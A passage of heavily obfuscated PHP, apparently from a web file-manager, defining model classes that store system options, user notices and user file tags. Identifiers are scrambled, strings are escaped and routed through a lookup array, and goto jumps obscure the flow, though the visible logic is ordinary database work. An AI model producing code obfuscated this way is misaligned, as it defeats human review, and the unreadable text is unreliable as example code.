È©[$Ä£¼«íÑ[33]]) ? $œÖ  È©[$Ä£¼«íÑ[33]] : 1, $Ä£¼«íÑ[2477] => isset($œÖ  È©[$Ä£¼«íÑ[2477]]) ? $œÖ  È©[$Ä£¼«íÑ[2477]] : 0, $Ä£¼«íÑ[835] => 0, $Ä£¼«íÑ[228] => 0); return parent::insert($­Òñ‚ë€); } public function userNoticeEdit($ŸÔ¶Üñ¡, $®ŸíêÀŸ) { $this->initUserOption(); return parent::update($ŸÔ¶Üñ¡, $®ŸíêÀŸ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\155\137\x6f\160\164\151\x6f\156"; protected $jsonField = array("\155\145\x6e\x75", "\x72\x6f\x6c\145", "\x72\x6f\x6c\x65\107\162\x6f\165\x70", "\162\x65\147\151\x73\164", "\x65\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ßøÅ±) { return "\x53\171\x73\164\145\155\117\x70\164\151\x6f\x6e\137{$ßøÅ±}"; } protected function optionDefault($…€ïøœÀ = '') { $öëì•Ğ =& $_SERVER[™¸œØ®Ü]; if ($…€ïøœÀ == $öëì•Ğ[12]) { return $GLOBALS[$öëì•Ğ[6]][$öëì•Ğ[459]]; } } } goto e†³Òİ’¯‡; fÄ‰†‰œ®¼: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($’ª€ì±Ş) { $È¾‰ô  =& $_SERVER[™¸œØ®Ü]; return array($È¾‰ô [2111] => array($È¾‰ô [2540] . USER_ID, $È¾‰ô [2112])); } protected function listData() { $°ÛıÄ¼İ =& $_SERVER[™¸œØ®Ü]; $Î£¦şÊ¶ = array($°ÛıÄ¼İ[1786] => USER_ID, $°ÛıÄ¼İ[561] => array($°ÛıÄ¼İ[2115], 0)); $é©ÆËÙõ = $°ÛıÄ¼İ[2541]; $óÙõìªÕ = $this->field($é©ÆËÙõ)->where($Î£¦şÊ¶)->order($°ÛıÄ¼İ[2118])->select(); return $óÙõìªÕ ? $óÙõìªÕ : array(); } protected function addToTag($¥ôŠêàø, $øàƒ²¶´) { $ÇÔ¯°¹Š =& $_SERVER[™¸œØ®Ü]; if (!Model($ÇÔ¯°¹Š[2268])->listData($øàƒ²¶´)) { return !1; } if (is_numeric($¥ôŠêàø)) { $ó¬ˆÌ = Model($ÇÔ¯°¹Š[915])->pathInfo($¥ôŠêàø); if (!$ó¬ˆÌ) { return !1; } } else { $ó¬ˆÌ = IO::infoSimple($¥ôŠêàø); if (!$ó¬ˆÌ) { return !1; } $‚À›µ­ = $ó¬ˆÌ[$ÇÔ¯°¹Š[32]]; $½Ê»¿Å² = $ó¬ˆÌ[$ÇÔ¯°¹Š[33]]; if (isset($ó¬ˆÌ[$ÇÔ¯°¹Š[487]])) { $½Ê»¿Å² = $ó¬ˆÌ[$ÇÔ¯°¹Š[487]] == $ÇÔ¯°¹Š[91] ? $ÇÔ¯°¹Š[78] : $ÇÔ¯°¹Š[232]; } } $Š€‰ø£û = array($ÇÔ¯°¹Š[1786] => USER_ID, $ÇÔ¯°¹Š[561] => $øàƒ²¶´, $ÇÔ¯°¹Š[497] => $¥ôŠêàø, $ÇÔ¯°¹Š[498] => $½Ê»¿Å² ? $½Ê»¿Å² : $ÇÔ¯°¹Š[492], $ÇÔ¯°¹Š[496] => $‚À›µ­ ? $‚À›µ­ : $ÇÔ¯°¹Š[12], $ÇÔ¯°¹Š[2000] => 0); if ($this->where($Š€‰ø£û)->find()) { return !1; } return $this->add($Š€‰ø£û); } protected function removeFromTag($ì¿ÍÙ÷«, $öœ‡µí) { $óÆÊ£„Ç =& $_SERVER[™¸œØ®Ü]; if (!Model($óÆÊ£„Ç[2268])->listData($öœ‡µí)) { return !1; } if (is_array($ì¿ÍÙ÷«)) { $ì¿ÍÙ÷« = array($óÆÊ£„Ç[7], $ì¿ÍÙ÷«); } $‚ÔŒ×ŠŒ = array($óÆÊ£„Ç[1786] => USER_ID, $óÆÊ£„Ç[561] => $öœ‡µí, $óÆÊ£„Ç[497] => $ì¿ÍÙ÷«); return $this->where($‚ÔŒ×ŠŒ)->delete(); } protected function removeByTag($ÇÇ¸³¿­) { $º–‚ª®² =& $_SERVER[™¸œØ®Ü]; if (!$ÇÇ¸³¿­) { return !1; } $Ô¾ÈÊÔ® = array($º–‚ª®²[1786] => USER_ID, $º–‚ª®²[561] => $ÇÇ¸³¿­); return $this->where($Ô¾ÈÊÔ®)->delete(); } protected function removeBySource($´®°”æ“) { $úĞ´‰—Ä =& $_SERVER[™¸œØ®Ü]; if (is_array($´®°”æ“)) { $´®°”æ“ = array($úĞ´‰—Ä[7], $´®°”æ“); } $¬şá²Ñ¥ = array($úĞ´‰—Ä[1786] => USER_ID, $úĞ´‰—Ä[561] => array($úĞ´‰—Ä[1110], 0), $úĞ´‰—Ä[497] => $´®°”æ“); return $this->where($¬şá²Ñ¥)->delete(); } }